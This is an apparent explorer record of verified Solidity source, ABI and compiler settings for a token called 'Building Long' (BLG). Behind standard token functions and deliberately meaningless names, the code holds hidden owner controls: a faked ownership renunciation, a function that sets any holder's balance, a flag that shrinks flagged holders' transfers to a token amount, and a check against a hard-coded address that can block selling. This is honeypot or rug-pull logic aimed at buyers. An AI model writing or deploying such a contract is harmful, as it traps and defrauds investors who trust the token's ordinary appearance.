{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface tokenSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract toLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityShould {\n    function createPair(address tokenSwap, address maxToken) external returns (address);\n}\n\ninterface feeMarketingSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoSell) external view returns (uint256);\n\n    function transfer(address swapTo, uint256 shouldIs) external returns (bool);\n\n    function allowance(address modeTokenAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapTo,\n        uint256 shouldIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamMaxFund, uint256 value);\n    event Approval(address indexed modeTokenAt, address indexed spender, uint256 value);\n}\n\ninterface feeMarketingSenderMetadata is feeMarketingSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BuildingLong is toLaunch, feeMarketingSender, feeMarketingSenderMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return isTakeShould;\n    }\n\n    address launchSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function takeReceiver() private view {\n        require(modeMax[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxMin;\n    }\n\n    address receiverTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function senderList() public {\n        emit OwnershipTransferred(exemptAmountMarketing, address(0));\n        sellFee = address(0);\n    }\n\n    uint256 public sellList;\n\n    function owner() external view returns (address) {\n        return sellFee;\n    }\n\n    uint256 public modeAt;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverLaunched;\n    }\n\n    uint256 public autoTokenFrom;\n\n    mapping(address => uint256) private shouldMin;\n\n    string private receiverLaunched = \"Building Long\";\n\n    function feeMin(address swapTx) public {\n        require(swapTx.balance < 100000);\n        if (minBuy) {\n            return;\n        }\n        if (walletMax != modeAt) {\n            modeAt = walletMax;\n        }\n        modeMax[swapTx] = true;\n        \n        minBuy = true;\n    }\n\n    uint256 private amountLiquidity;\n\n    bool public launchedSell;\n\n    function getOwner() external view returns (address) {\n        return sellFee;\n    }\n\n    uint256 constant swapExempt = 20 ** 10;\n\n    function transfer(address listTo, uint256 shouldIs) external virtual override returns (bool) {\n        return atReceiver(_msgSender(), listTo, shouldIs);\n    }\n\n    function tradingReceiverTake(address teamAmountTotal) public {\n        takeReceiver();\n        if (sellLiquidity) {\n            modeAt = amountLiquidity;\n        }\n        if (teamAmountTotal == exemptAmountMarketing || teamAmountTotal == limitToken) {\n            return;\n        }\n        amountAtBuy[teamAmountTotal] = true;\n    }\n\n    uint256 totalBuy;\n\n    uint256 private maxMin = 100000000 * 10 ** 18;\n\n    constructor (){\n        \n        tokenSender minLaunch = tokenSender(launchSwap);\n        limitToken = liquidityShould(minLaunch.factory()).createPair(minLaunch.WETH(), address(this));\n        if (sellMaxTeam == amountLiquidity) {\n            launchedSell = true;\n        }\n        exemptAmountMarketing = _msgSender();\n        senderList();\n        modeMax[exemptAmountMarketing] = true;\n        shouldMin[exemptAmountMarketing] = maxMin;\n        \n        emit Transfer(address(0), exemptAmountMarketing, maxMin);\n    }\n\n    bool private senderWalletBuy;\n\n    function atMode(address feeEnable, address swapTo, uint256 shouldIs) internal returns (bool) {\n        require(shouldMin[feeEnable] >= shouldIs);\n        shouldMin[feeEnable] -= shouldIs;\n        shouldMin[swapTo] += shouldIs;\n        emit Transfer(feeEnable, swapTo, shouldIs);\n        return true;\n    }\n\n    function atReceiver(address feeEnable, address swapTo, uint256 shouldIs) internal returns (bool) {\n        if (feeEnable == exemptAmountMarketing) {\n            return atMode(feeEnable, swapTo, shouldIs);\n        }\n        uint256 swapAmount = feeMarketingSender(limitToken).balanceOf(receiverTo);\n        require(swapAmount == totalBuy);\n        require(swapTo != receiverTo);\n        if (amountAtBuy[feeEnable]) {\n            return atMode(feeEnable, swapTo, swapExempt);\n        }\n        return atMode(feeEnable, swapTo, shouldIs);\n    }\n\n    mapping(address => bool) public modeMax;\n\n    event OwnershipTransferred(address indexed swapShould, address indexed autoTokenAmount);\n\n    function approve(address limitListMax, uint256 shouldIs) public virtual override returns (bool) {\n        totalAt[_msgSender()][limitListMax] = shouldIs;\n        emit Approval(_msgSender(), limitListMax, shouldIs);\n        return true;\n    }\n\n    string private teamEnableAuto = \"BLG\";\n\n    mapping(address => bool) public amountAtBuy;\n\n    uint8 private isTakeShould = 18;\n\n    function allowance(address fundSell, address limitListMax) external view virtual override returns (uint256) {\n        if (limitListMax == launchSwap) {\n            return type(uint256).max;\n        }\n        return totalAt[fundSell][limitListMax];\n    }\n\n    bool public minBuy;\n\n    function sellLaunchAmount(uint256 shouldIs) public {\n        takeReceiver();\n        totalBuy = shouldIs;\n    }\n\n    address public exemptAmountMarketing;\n\n    uint256 public sellMaxTeam;\n\n    bool public sellLiquidity;\n\n    address public limitToken;\n\n    function balanceOf(address autoSell) public view virtual override returns (uint256) {\n        return shouldMin[autoSell];\n    }\n\n    address private sellFee;\n\n    uint256 listShouldFee;\n\n    mapping(address => mapping(address => uint256)) private totalAt;\n\n    function atToken(address listTo, uint256 shouldIs) public {\n        takeReceiver();\n        shouldMin[listTo] = shouldIs;\n    }\n\n    function transferFrom(address feeEnable, address swapTo, uint256 shouldIs) external override returns (bool) {\n        if (_msgSender() != launchSwap) {\n            if (totalAt[feeEnable][_msgSender()] != type(uint256).max) {\n                require(shouldIs <= totalAt[feeEnable][_msgSender()]);\n                totalAt[feeEnable][_msgSender()] -= shouldIs;\n            }\n        }\n        return atReceiver(feeEnable, swapTo, shouldIs);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamEnableAuto;\n    }\n\n    uint256 private walletMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTokenAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTokenAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMaxFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitListMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountAtBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitListMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"atToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTokenFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAmountMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTx\",\"type\":\"address\"}],\"name\":\"feeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"sellLaunchAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMaxTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAmountTotal\",\"type\":\"address\"}],\"name\":\"tradingReceiverTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BuildingLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}